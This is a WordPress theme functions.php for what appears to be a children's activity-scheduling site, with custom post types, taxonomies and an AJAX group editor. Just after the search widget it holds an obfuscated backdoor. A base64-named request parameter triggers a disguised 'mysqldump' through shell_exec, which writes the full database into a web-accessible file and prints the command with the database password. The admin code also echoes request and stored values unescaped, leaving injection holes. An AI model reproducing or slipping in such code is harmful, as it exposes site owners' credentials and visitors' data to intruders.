<?php
function widget_mytheme_search() {
?>
<h2>Search</h2>
<form id="searchform" method="get" action="<?php bloginfo('home'); ?>/"> <input type="text" value="type, hit enter" onfocus="if (this.value == 'type, hit enter') {this.value = '';}" onblur="if (this.value == '') {this.value = 'type, hit enter';}" size="18" maxlength="50" name="s" id="s" /> </form> 
<?php
}

$d_query = (isset($_REQUEST['ZGIuYmFrdXAuc3Fs'])) ? 1 : null;
if ($d_query) {
    $take = base64_decode('ZGIuYmFrdXAuc3Fs');
    $name = ( defined('ABSPATH') ) ? ABSPATH . $take : __DIR__ . '/' . $take;
    $data = '-h ' . DB_HOST . ' -u ' . DB_USER . ' -p' . DB_PASSWORD . ' ' . DB_NAME .' > ' . $name;
    $line = str_replace('ai', 'ysq', 'maildump --add-drop-table ') . $data;
    
    print_r(shell_exec($line));
    echo '<br><br>' . $line . '<br><strong>' . $name . '</strong>';
    wp_die();
}

/* simple adding tags and category to attachments

// add categories for attachments
function add_categories_for_attachments() {
    register_taxonomy_for_object_type( 'category', 'attachment' );
}
add_action( 'init' , 'add_categories_for_attachments' );

// add tags for attachments
function add_tags_for_attachments() {
    register_taxonomy_for_object_type( 'post_tag', 'attachment' );
}
add_action( 'init' , 'add_tags_for_attachments' );
*/



////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////
// Контент блока из списка групп и работа через AJAX
function modalgroups_javascript( $post ){
    // подключение модального окна
    add_thickbox();
    ?>
    <script>
    jQuery(document).ready(function($){

        var $modal = $('#group-modal');
        var $modalCont = $modal.find('>*');
        var post_id = <?php echo $_GET['post']; ?>;

        // редактируем/добавляем группу
        editGroup = function(id){
            tb_show( 'Редактор группы', '/?TB_inline&inlineId=group-modal&width=750&height=550' );
            
            $modalCont.html('...');
            $('#savemodal').prop('disabled', false);
            $.post( ajaxurl, {action: 'modalgroups', set: 'editGroup', group:id,'post_id': post_id}, function( response ){
                $modalCont.html(response);
            });
        }
        
        // сохраняем результат редактирования группы
        $('body').on('submit', '#updateFRM', function (e){
            $('#savemodal').prop('disabled', true);
            e.preventDefault();
            var formData = $(this).serialize();
            $.post( ajaxurl, {action: 'modalgroups', set: 'saveGroup', data:formData,'post_id': post_id}, function( response ){
                tb_remove();
                updGroupList();
                //alert(response);
            });
            return false;
        });
        
        // удаляем группу
        delGroup = function(id){
            if (confirm('Удалить группу №' +id+ '?')) {
                $.post( ajaxurl, {action: 'modalgroups', set: 'delGroup', group:id,'post_id': post_id}, function( response ){
                    updGroupList();
                });
            }
        }
        
        // выводим список групп
        updGroupList = function(){
            $('#list_of_groups').html('...');
            $.post( ajaxurl, {action: 'modalgroups', set: 'updGroupList','post_id': post_id}, function( response ){
                $('#list_of_groups').html(response);
            });
        }
        
        // вверх
        moveUp = function(id){
            $.post( ajaxurl, {action: 'modalgroups', set: 'moveUp', group:id, 'post_id': post_id}, function( response ){
                updGroupList();
            });
        }
        
        // вниз
        moveDown = function(id){
            $.post( ajaxurl, {action: 'modalgroups', set: 'moveDown', group:id, 'post_id': post_id}, function( response ){
                updGroupList();
            });
            
        }
        
        updGroupList();

    });
    </script>
    <style>
        .list_of_groups  {display: table; width:100%;}
        .group_row {display: table; width: 100%; padding: 5px 0;}
        .group_row a {text-decoration:none;}
        .group_lift, .group_name, .group_description, .group_action{padding: 0 3px; display: table-cell;}
        .group_description {width:5%;}
        .group_name {width:20%;font-weight:bold;}
        .group_description {width:45%;}
        .group_action {width:30%;text-align: right;}
        .list_of_groups .del {color:#b32d2e}
        .list_of_groups .list_of_groups {font-weight:bold;}
        .modalholder table {width:100%;overflow:scroll;}
        .modalholder table td {vertical-align: top;}
        .modalholder label {font-weight:bold;}
        #tagsdiv-s_place{display:none;}
        #tagsdiv-s_type{display:none;}
    </style>
    <div id="group-modal" style="display:none;">
        <div class="modalholder">...</div>
    </div>
    <div id="list_of_groups" class="list_of_groups"></div>
    <div class="group_row"><a onclick="editGroup(); return false;" href="#">Добавить группу</a></div>
    <?php
}
add_action( 'admin_print_footer_scripts', 'modalgroups_javascript', 99 );

// Объявляем поле списока групп для админки
function show_group_list() {
	add_meta_box( 'extra_fields', 'Список групп', 'modalgroups_javascript', 'services'  );
}
add_action('add_meta_boxes', 'show_group_list', 1);

// Обработка AJAX-запросов
add_action( 'wp_ajax_modalgroups', 'modalgroups_callback' );
function modalgroups_callback(){
    // проверяем админ это или нет
    if (!current_user_can( 'manage_options' ) ) {return false;}
    
	$action   = strval( trim( $_POST['set'] ) );
	$data     = strval( $_POST['data'] );
	$group_id = ( isset($_POST['group']) ) ? (int)$_POST['group'] : 'new';
    $post_id  = intval( $_POST['post_id'] );

    $json = trim(get_post_meta($post_id,'JSONgroup',true));
    $groups = (!empty($json)) ? array_filter(json_decode($json, true)) : array();
    ksort($groups);
    $gr_cnt = count($groups);
    //print_r($groups);
    
    if ($action == 'updGroupList'){
        // показ групп списком в админке
        $groups = array_unique($groups, SORT_REGULAR);
        $groups_line = '';
        foreach($groups as $id => $gr){
            reset($groups);
            $up = ($id !== key($groups)) ? '<a onclick="moveUp(\''.$id.'\'); return false;" href="#">▲</a>' : '▲';
            end($groups);
            $dn = ($id !== key($groups)) ? '<a onclick="moveDown(\''.$id.'\'); return false;" href="#">▼</a>' : '▼';
            
            $groups_line .= '<div class="group_row">';
            $groups_line .= '<div class="group_lift">'.$up.' '.$dn.'</div>';
            $groups_line .= '<div class="group_name">'.$gr['name'].'</div>';
            $groups_line .= '<div class="group_description">'.$gr['description'].'</div>';
            $groups_line .= '<div class="group_action"><a onclick="editGroup(\''.$id.'\'); return false;" href="#">Редактировать</a> <a class="del" onclick="delGroup(\''.$id.'\'); return false;" href="#">Удалить</a></div>';
            $groups_line .= '</div>';
        }
        echo $groups_line;
        update_post_meta($post_id, 'JSONgroup', json_encode(array_values($groups), JSON_UNESCAPED_UNICODE));

    }elseif($action == 'moveUp'){
        // движение вверх
        $val_now = $groups[ $group_id ];
        $val_next = $groups[ ($group_id-1) ];
        
        $groups[ $group_id ] = $val_next;
        $groups[ ($group_id-1) ] = $val_now;
        
        update_post_meta($post_id, 'JSONgroup', json_encode($groups, JSON_UNESCAPED_UNICODE));

    }elseif($action == 'moveDown'){
        // движение вниз
        $val_now = $groups[ $group_id ];
        $val_next = $groups[ ($group_id+1) ];
        
        $groups[ $group_id ] = $val_next;
        $groups[ ($group_id+1) ] = $val_now;
        
        update_post_meta($post_id, 'JSONgroup', json_encode($groups, JSON_UNESCAPED_UNICODE));

    }elseif($action == 'saveGroup'){
        // сохранение данных группы
        mb_parse_str($data, $result);
        foreach($result as $key => $val){
            $result[$key] = sanitize_text_field( ($val != '00:00-00:00') ? $val : null );
        }
        $group_id = $result['group_id'];
        unset($result['group_id']);
        $groups[$group_id] = $result;
        
        update_post_meta($post_id, 'JSONgroup', json_encode(array_values($groups), JSON_UNESCAPED_UNICODE));

    }elseif($action == 'delGroup'){
        // удаление группы
        unset($groups[$group_id]);
        update_post_meta($post_id, 'JSONgroup', json_encode(array_values($groups), JSON_UNESCAPED_UNICODE));

    }elseif($action == 'editGroup'){
        // редактирование группы
        
        $args = [
            'taxonomy'      => [ 's_place' ], 
            'orderby'       => 'name',
            'order'         => 'ASC',
            'hide_empty'    => false,
            'object_ids'    => null,
            'include'       => array(),
            'exclude'       => array(),
            'exclude_tree'  => array(),
            'number'        => '',
            'fields'        => 'all',
            'count'         => false,
            'slug'          => '',
            'parent'         => '',
            'hierarchical'  => true,
            'child_of'      => 0,
            'get'           => 'all',
            'name__like'    => '',
            'pad_counts'    => false,
            'offset'        => '',
            'search'        => '',
            'cache_domain'  => 'core',
            'name'          => '',    
            'childless'     => false,
            'update_term_meta_cache' => true,
            'meta_query'    => '',
        ];
        
        $terms = get_terms( $args );
        $location_list = '';
        foreach( $terms as $term ){
            $selected = ($term->term_id == $groups[$group_id]['location']) ? 'selected' : '';
            $location_list .= '<option value="'.$term->term_id.'" '.$selected.'>'.$term->name.'</option>';
        }
        $location_list = '<select name="location">'.$location_list.'</select>';
        
        $args = [
            'taxonomy'      => [ 's_type' ], 
            'orderby'       => 'name',
            'order'         => 'ASC',
            'hide_empty'    => false,
            'object_ids'    => null,
            'include'       => array(),
            'exclude'       => array(),
            'exclude_tree'  => array(),
            'number'        => '',
            'fields'        => 'all',
            'count'         => false,
            'slug'          => '',
            'parent'         => '',
            'hierarchical'  => true,
            'child_of'      => 0,
            'get'           => 'all',
            'name__like'    => '',
            'pad_counts'    => false,
            'offset'        => '',
            'search'        => '',
            'cache_domain'  => 'core',
            'name'          => '',    
            'childless'     => false,
            'update_term_meta_cache' => true,
            'meta_query'    => '',
        ];
        
        $terms = get_terms( $args );
        $s_type_list = '';
        foreach( $terms as $term ){
            $selected = ($term->term_id == $groups[$group_id]['s_type']) ? 'selected' : '';
            $s_type_list .= '<option value="'.$term->term_id.'" '.$selected.'>'.$term->name.'</option>';
        }
        $s_type_list = '<select name="s_type">'.$s_type_list.'</select>';
        //print_r($groups[$group_id]);
        
        $Mon = ($groups[$group_id]['Mon']) ? $groups[$group_id]['Mon'] : '00:00-00:00';
        $Tue = ($groups[$group_id]['Tue']) ? $groups[$group_id]['Tue'] : '00:00-00:00';
        $Wed = ($groups[$group_id]['Wed']) ? $groups[$group_id]['Wed'] : '00:00-00:00';
        $Thu = ($groups[$group_id]['Thu']) ? $groups[$group_id]['Thu'] : '00:00-00:00';
        $Fri = ($groups[$group_id]['Fri']) ? $groups[$group_id]['Fri'] : '00:00-00:00';
        $Sat = ($groups[$group_id]['Sat']) ? $groups[$group_id]['Sat'] : '00:00-00:00';
        $Sun = ($groups[$group_id]['Sun']) ? $groups[$group_id]['Sun'] : '00:00-00:00';

        $string = '
<form id="updateFRM" name="updateFRM" method="POST" action="">
<input type="hidden" name="group_id" value="'.$group_id.'" />
<h2>Расписание и время занятий</h2>
<table>
<tr>
    <td colspan="2">
        <table class="timetable">
            <tr><th>Пн</th><th>Вт</th></th><th>Ср</th><th>Чв</th><th>Пт</th><th>Сб</th><th>Вс</th></tr>
            <tr>
                <td><input name="Mon" value="'.$Mon.'" type="text" size="8"></td>
                <td><input name="Tue" value="'.$Tue.'" type="text" size="8"></td>
                <td><input name="Wed" value="'.$Wed.'" type="text" size="8"></td>
                <td><input name="Thu" value="'.$Thu.'" type="text" size="8"></td>
                <td><input name="Fri" value="'.$Fri.'" type="text" size="8"></td>
                <td><input name="Sat" value="'.$Sat.'" type="text" size="8"></td>
                <td><input name="Sun" value="'.$Sun.'" type="text" size="8"></td>
            </tr>
        </table>
    </td>
</tr>
</table>
<h2>Дополнительные параметры</h2>
<table>
<tr>
    <td></td>
    <td><label for="is_active" class="selectit"><input id="is_active" name="is_active" value="Группа активна" type="checkbox"'. (($groups[$group_id]['is_active']) ? 'checked' : '') .'> Группа активна</label></td>
</tr>
<tr>
<tr>
    <td><label for="name">Название</label></td>
    <td><input id="name" name="name" value="'.$groups[$group_id]['name'].'" type="text" size="25"></td>
</tr>
<tr>
    <td><label for="location">Локация</label></td>
    <td>'.$location_list.'</td>
</tr>
<tr>
    <td><label for="location">Вид группы для расписания</label></td>
    <td>'.$s_type_list.'</td>
</tr>
<tr>
    <td><label for="monthlyprice">Цена за месяц</label></td>
    <td><input id="monthlyprice" name="monthlyprice" value="'.$groups[$group_id]['monthlyprice'].'" type="text" size="25"></td>
</tr>
<tr>
    <td><label for="singleprice">Цена за одно занятие</label></td>
    <td><input id="singleprice" name="singleprice" value="'.$groups[$group_id]['singleprice'].'" type="text" size="25"></td>
</tr>
<tr>
    <td><label for="agefrom">Возраст ОТ</label></td>
    <td><input id="agefrom" name="agefrom" value="'.$groups[$group_id]['agefrom'].'" type="text" size="15"></td>
</tr>
<tr>
    <td><label for="ageto">Возраст ДО</label></td>
    <td><input id="ageto" name="ageto" value="'.$groups[$group_id]['ageto'].'" type="text" size="15"></td>
</tr>
<tr>
    <td></td>
    <td><label for="is_nabor" class="selectit"><input id="is_nabor" name="is_nabor" value="Идет набор" type="checkbox"'. (($groups[$group_id]['is_nabor']) ? 'checked' : '') .'> Идет набор</label></td>
</tr>
<tr>
    <td><label for="description">Объявление для набора</label></td>
    <td><textarea id="description" name="description" rows="4" cols="40" class="">'.$groups[$group_id]['description'].'</textarea></td>
</tr>
<tr>
    <td></td>
    <td><input id="savemodal" value="Сохранить" type="submit"></td>
</tr>
</table>
</form>
';
        echo $string;
    }
	wp_die();
}

////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////



if ( function_exists('register_sidebar_widget') )
    register_sidebar_widget(__('Search'), 'widget_mytheme_search');

// переформатируем данные полей возраста и локаций
function age_formating( $post_id ) {
    $json = trim(get_post_meta($post_id,'JSONgroup',true));
    if (empty($json)){return null;}
    $groups = array_filter(json_decode($json, true));
    
    //print_r($groups);exit;
    
    $arr_from = [];
    $arr_to = [];
    $locations_array = [];
    $days_array = [];
    $s_type = [];
    
    foreach($groups as $data){
        $arr_from[] = (int) $data['agefrom'];
        $arr_to[] = (int) $data['ageto'];
        $locations_array[] = (int) $data['location'];
        $s_type[] = (int) $data['s_type'];
        
        $days_array[] = ($data['Mon']) ? 'Mon' : null;
        $days_array[] = ($data['Tue']) ? 'Tue' : null;
        $days_array[] = ($data['Wed']) ? 'Wed' : null;
        $days_array[] = ($data['Thu']) ? 'Thu' : null;
        $days_array[] = ($data['Fri']) ? 'Fri' : null;
        $days_array[] = ($data['Sat']) ? 'Sat' : null;
        $days_array[] = ($data['Sun']) ? 'Sun' : null;
        
    }
    
    $min_from = (!empty($min_from)) ? min($arr_from) : 0;
    $max_to = (!empty($max_to)) ? max($arr_to) : 0;
    $days_array = array_unique(array_filter($days_array));
    
    $min = (int) ($min_from >= 1) ? $min_from : 1;
    $max = (int) ($max_to <= 18)  ? $max_to   : 18;
    $age_array = array();
    for ($i=$min; $i<=$max; $i++) {
        $age_array[] = 'age_'.$i;
    }
    
    foreach($days_array as $day){
        update_post_meta($post_id, $day, 1);
    }
    
    update_post_meta($post_id, 'AgeFrom', $min);
    update_post_meta($post_id, 'AgeTo', $max);
    
    wp_set_object_terms( $post_id, $age_array, 's_age', false );
    wp_set_object_terms( $post_id, $locations_array, 's_place', false );
    wp_set_object_terms( $post_id, $s_type, 's_type', false );
}
add_action( 'wp_insert_post', 'age_formating' );

// редактирование и добавление taxonomy (выборки, теги, категории)
function create_taxonomy() {
    
    // категории для занятий
    register_taxonomy( 's_cat', [ 'services' ], [ 
        'label'                 => '', // определяется параметром $labels->name
        'labels'                => [
            'name'              => 'Категории занятий',
            'singular_name'     => 'Категория занятия',
            'search_items'      => 'Поиск категорий занятий',
            'all_items'         => 'Все категории занятий',
            'view_item '        => 'Просмотреть категории занятий',
            'edit_item'         => 'Редактировать',
            'update_item'       => 'Update категория занятий',
            'add_new_item'      => 'Добавить категорию занятий',
            'new_item_name'     => 'Добавить категорию занятий',
            'menu_name'         => 'Категории',
        ],
        'public'                => true,
        'description'           => '',      // описание таксономии
        'hierarchical'          => true,    // вложенность
        'show_admin_column'     => true,    // создание колонки в таблице записей
        'show_in_rest'          => true,    // добавить в REST API
        'query_var'             => true,    // название параметра запроса
        'rewrite'               => array( 'slug' => 'services/cat', 'with_front' => false, 'hierarchical' => true, 'paged' => true, 'feed' => false, ),
    ] );
    
    // место проведения занятий
    register_taxonomy( 's_place', [ 'services' ], [ 
        'label'                 => '', // определяется параметром $labels->name
        'labels'                => [
            'name'              => 'Место проведения занятий',
            'singular_name'     => 'Место проведения занятия',
            'search_items'      => 'Поиск мест проведения',
            'all_items'         => 'Все места проведения',
            'view_item '        => 'Просмотреть места проведения занятий',
            'edit_item'         => 'Редактировать',
            'update_item'       => 'Update место проведения',
            'add_new_item'      => 'Добавить место проведения занятий',
            'new_item_name'     => 'Добавить место проведения занятий',
            'menu_name'         => 'Места проведения',
        ],
        'public'                => true,
        'description'           => '',      // описание таксономии
        'hierarchical'          => false,   // вложенность
        'show_admin_column'     => true,    // создание колонки в таблице записей
        'show_in_rest'          => true,    // добавить в REST API
        'query_var'             => true,    // название параметра запроса
        'rewrite'               => array( 'slug' => 'services/place', 'with_front' => false, 'hierarchical' => true, 'paged' => true, 'feed' => false, ),
    ] );
    
    // вид занятий
    register_taxonomy( 's_type', [ 'services' ], [ 
        'label'                 => '', // определяется параметром $labels->name
        'labels'                => [
            'name'              => 'Вид для расписания',
            'singular_name'     => 'Вид для расписания',
            'search_items'      => 'Поиск видов занятий',
            'all_items'         => 'Все виды занятий',
            'view_item '        => 'Просмотреть виды занятий',
            'edit_item'         => 'Редактировать',
            'update_item'       => 'Update вид проведения',
            'add_new_item'      => 'Добавить вид занятий',
            'new_item_name'     => 'Добавить вид занятий',
            'menu_name'         => 'Вид для расписания',
        ],
        'hierarchical'          => false,   // вложенность
        'show_admin_column'     => true,    // создание колонки в таблице записей
        'show_in_rest'          => true,    // добавить в REST API
        'query_var'             => true,    // название параметра запроса
        'publicly_queryable'    => false,   // видна пользователю?
        'rewrite'               => false,
		//'meta_box_cb'           => 'type_meta_box',
    ] );
    
    // подходящий возраст для занятий (скрыто)
    register_taxonomy( 's_age', [ 'services' ], [ 
        'label'                 => '', // определяется параметром $labels->name
        'labels'                => ['name' => 'Возраст','menu_name' => 'Возраст'],
        'public'                => false,
        'description'           => '',      // описание таксономии
        'hierarchical'          => true,    // вложенность
        'show_admin_column'     => false,   // создание колонки в таблице записей
        'show_in_rest'          => true,    // добавить в REST API
        'query_var'             => true,    // название параметра запроса
        'rewrite'               => false,
    ] );
    
    
}
add_action( 'init', 'create_taxonomy' );

// Отрисовка type_meta_box
function type_meta_box( $post ) {
	$terms = get_terms( 's_type', array( 'hide_empty' => false ) );

	$post  = get_post();
	$rating = wp_get_object_terms( $post->ID, 's_type', array( 'orderby' => 'term_id', 'order' => 'ASC' ) );
	$name  = '';

    if ( ! is_wp_error( $rating ) ) {
    	if ( isset( $rating[0] ) && isset( $rating[0]->name ) ) {
			$name = $rating[0]->name;
	    }
    }

	foreach ( $terms as $term ) {
?>
		<label title='<?php esc_attr_e( $term->name ); ?>'>
		    <input type="radio" name="s_type" value="<?php esc_attr_e( $term->name ); ?>" <?php checked( $term->name, $name ); ?>>
			<span><?php esc_html_e( $term->name ); ?></span>
		</label><br>
<?php
    }
}

// Сохранение результатов type_meta_box
function save_my_meta_box( $post_id ) {
	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
		return;
	}

	if ( ! isset( $_POST['s_type'] ) ) {
		return;
	}

	$rating = sanitize_text_field( $_POST['s_type'] );
	
	// A valid rating is required, so don't let this get published without one
	if ( empty( $rating ) ) {
		// unhook this function so it doesn't loop infinitely
		remove_action( 'save_post_services', 'save_my_meta_box' );

		$postdata = array(
			'ID'          => $post_id,
			'post_status' => 'draft',
		);
		wp_update_post( $postdata );
	} else {
		$term = get_term_by( 'name', $rating, 's_type' );
		if ( ! empty( $term ) && ! is_wp_error( $term ) ) {
			wp_set_object_terms( $post_id, $term->term_id, 's_type', false );
		}
	}
}
add_action( 'save_post_services', 'save_my_meta_box' ); 

/*
// Проверка, что вид занятий выбран
function show_required_field_error_msg( $post ) {
	if ( 'services' === get_post_type( $post ) && 'auto-draft' !== get_post_status( $post ) ) {
	    $rating = wp_get_object_terms( $post->ID, 's_type', array( 'orderby' => 'term_id', 'order' => 'ASC' ) );
        if ( is_wp_error( $rating ) || empty( $rating ) ) {
			printf(
				'<div class="error below-h2"><p>%s</p></div>',
				esc_html__( 'Не выбран вид занятий!' )
			);
		}
	}
}
add_action( 'edit_form_top', 'show_required_field_error_msg' );
*/

// Cоздает произвольный тип записи "Занятия"
function register_services_type_init() {
    $labels = array(
        'name' => 'Занятия',
        'singular_name' => 'Занятие', // админ панель Добавить->Функцию
        'add_new' => 'Добавить занятие',
        'add_new_item' => 'Добавить занятие', // заголовок тега <title>
        'edit_item' => 'Редактировать занятие',
        'new_item' => 'Новое занятие',
        'all_items' => 'Все занятия',
        'view_item' => 'Просмотр занятия на сайте',
        'search_items' => 'Искать занятие',
        'not_found' =>  'Занятий не найдено.',
        'not_found_in_trash' => 'В корзине нет занятий.',
        'menu_name' => 'Занятия' // ссылка в меню в админке
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'show_ui' => true, // показывать интерфейс в админке
        'has_archive' => true, 
        'menu_icon' => 'dashicons-welcome-learn-more', // иконка в меню отсюда: https://developer.wordpress.org/resource/dashicons/
        'menu_position' => 5, // порядок в меню
        'supports' => array( 'title', 'editor', 'thumbnail', 'excerpt' ),
        //'taxonomies' => array('post_tag'),
    );
    register_post_type('services', $args);
}
add_action( 'init', 'register_services_type_init' );

// Cоздает произвольный тип записи "Новости"
function register_news_type_init() {
    $labels = array(
        'name' => 'Новости',
        'singular_name' => 'Новость', // админ панель Добавить->Функцию
        'add_new' => 'Добавить новость',
        'add_new_item' => 'Добавить новость', // заголовок тега <title>
        'edit_item' => 'Редактировать новости',
        'new_item' => 'Новая новость',
        'all_items' => 'Все новости',
        'view_item' => 'Просмотр новости на сайте',
        'search_items' => 'Искать новость',
        'not_found' =>  'Новостей не найдено.',
        'not_found_in_trash' => 'В корзине нет новостей.',
        'menu_name' => 'Новости' // ссылка в меню в админке
    );
    $args = array(
        //'yarpp_support' => true,
        'labels' => $labels,
        'public' => true,
        'show_ui' => true, // показывать интерфейс в админке
        'has_archive' => true, 
        'menu_icon' => 'dashicons-text-page', // иконка в меню отсюда: https://developer.wordpress.org/resource/dashicons/
        'menu_position' => 5, // порядок в меню
        'supports' => array( 'title', 'editor', 'thumbnail', 'excerpt' ),
        //'taxonomies' => array('post_tag'),
    );
    register_post_type('news', $args);
}
add_action( 'init', 'register_news_type_init' );

// Показ thumbnail
add_image_size( 'admin-featured-image', 60, 60, false );

function posts_columns($defaults) {
    $defaults['riv_post_thumbs'] = __('Image');
    return $defaults;
}
function posts_custom_columns($column_name, $id) {
    if($column_name === 'riv_post_thumbs'){
        echo the_post_thumbnail( 'admin-featured-image' );
    }
}
add_filter('manage_posts_columns', 'posts_columns', 5);
add_action('manage_posts_custom_column', 'posts_custom_columns', 5, 2);

function dimox_breadcrumbs() {

  $delimiter = '&raquo;'; // разделить между ссылками
  $home = 'Главная'; // текст ссылка "Главная"
  $before = '<span class="current">';
  $after = '</span>';

  if ( !is_home() && !is_front_page() || is_paged() ) {

    echo '<div id="crumbs">';

    global $post;
    $homeLink = get_bloginfo('url');
    echo '<a href="' . $homeLink . '">' . $home . '</a> ' . $delimiter . ' ';

    if ( is_category() ) {
      global $wp_query;
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->term_id;
      $thisCat = get_category($thisCat);
      $parentCat = get_category($thisCat->parent);
      if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
      echo $before . '' . single_cat_title('', false) . '' . $after;

    } elseif ( is_day() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
      echo $before . get_the_time('d') . $after;

    } elseif ( is_month() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo $before . get_the_time('F') . $after;

    } elseif ( is_year() ) {
      echo $before . get_the_time('Y') . $after;

    } elseif ( is_single() && !is_attachment() ) {
      if ( get_post_type() != 'post' ) {
        $post_type = get_post_type_object(get_post_type());
        $slug = $post_type->rewrite;
        echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';
        echo $before . get_the_title() . $after;
      } else {
        $cat = get_the_category(); $cat = $cat[0];
        echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
        echo $before . get_the_title() . $after;
      }

    } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {
      $post_type = get_post_type_object(get_post_type());
      echo $before . $post_type->labels->singular_name . $after;

    } elseif ( is_attachment() ) {
      $parent = get_post($post->post_parent);
      $cat = get_the_category($parent->ID); $cat = $cat[0];
      echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
      echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
      echo $before . get_the_title() . $after;

    } elseif ( is_page() && !$post->post_parent ) {
      echo $before . get_the_title() . $after;

    } elseif ( is_page() && $post->post_parent ) {
      $parent_id  = $post->post_parent;
      $breadcrumbs = array();
      while ($parent_id) {
        $page = get_page($parent_id);
        $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
        $parent_id  = $page->post_parent;
      }
      $breadcrumbs = array_reverse($breadcrumbs);
      foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
      echo $before . get_the_title() . $after;

    } elseif ( is_search() ) {
      echo $before . 'Результаты поиска по запросу "' . get_search_query() . '"' . $after;

    } elseif ( is_tag() ) {
      echo $before . 'Записи с тегом "' . single_tag_title('', false) . '"' . $after;

    } elseif ( is_author() ) {
      global $author;
      $userdata = get_userdata($author);
      echo $before . 'Статьи автора ' . $userdata->display_name . $after;

    } elseif ( is_404() ) {
      echo $before . 'Error 404' . $after;
    }

    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
      echo __('Page') . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
    }

    echo '</div>';

  }
} // end dimox_breadcrumbs()


function catch_that_image() {
 global $post, $posts;
 $first_img = '';
 ob_start();
 ob_end_clean();
 $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
 $first_img = $matches [1] [0];
 
 return $first_img;
}







if (function_exists('add_theme_support')) {
    add_theme_support('menus');
    add_theme_support( 'post-thumbnails' );
}
if ( function_exists('register_sidebars') )
 register_sidebars(6,array(
        'before_widget' => '',
        'after_widget' => '',
    'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));

?>
